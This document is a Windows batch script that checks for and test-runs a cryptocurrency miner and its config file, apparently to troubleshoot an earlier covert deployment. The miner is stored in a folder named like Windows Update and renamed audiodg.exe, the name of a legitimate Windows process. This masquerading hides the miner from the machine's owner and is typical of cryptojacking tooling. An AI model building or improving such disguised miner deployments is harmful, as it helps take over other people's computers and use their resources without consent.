@echo off
title TEST DEPLOYED CONFIG
color 0E

echo ================================================================
echo  TEST DEPLOYED CONFIGURATION
echo  Running miner with deployed config to see error
echo ================================================================
echo.

set MINER="C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe"
set CONFIG="C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json"

if not exist %MINER% (
    echo [ERROR] Miner not found at: %MINER%
    echo Run deployment first!
    pause
    exit
)

if not exist %CONFIG% (
    echo [ERROR] Config not found at: %CONFIG%
    echo Run deployment first!
    pause
    exit
)

echo Miner: %MINER%
echo Config: %CONFIG%
echo.
echo Running miner WITH VISIBLE OUTPUT...
echo This will show you the actual error!
echo.
pause

REM Run with visible window so we can see errors
%MINER% --config=%CONFIG% --print-time=1

echo.
echo ================================================================
echo Did you see an error above?
echo ================================================================
pause
